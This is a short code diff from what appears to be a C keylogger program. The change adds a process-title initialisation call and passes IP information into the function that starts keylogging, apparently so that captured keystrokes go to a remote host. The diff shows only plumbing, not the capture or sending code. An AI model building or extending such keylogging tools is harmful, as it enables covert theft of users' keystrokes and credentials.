@@ -66,6 +66,8 @@ int main(int argc, char **argv)
         .args = &args,
     };
 
+    init_process_title(argc, argv);
+
     uint32_t dest_ip;
     inet_pton(AF_INET, "8.8.8.8", &dest_ip);
 
@@ -224,7 +226,7 @@ static int start_keylog_handler(struct fsm_context *context, struct fsm_error *e
 
     SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");
 
-    if (start_keylogging() != 0)
+    if (start_keylogging(ctx->args->ip_info) != 0)
     {
         return STATE_ERROR;
     }
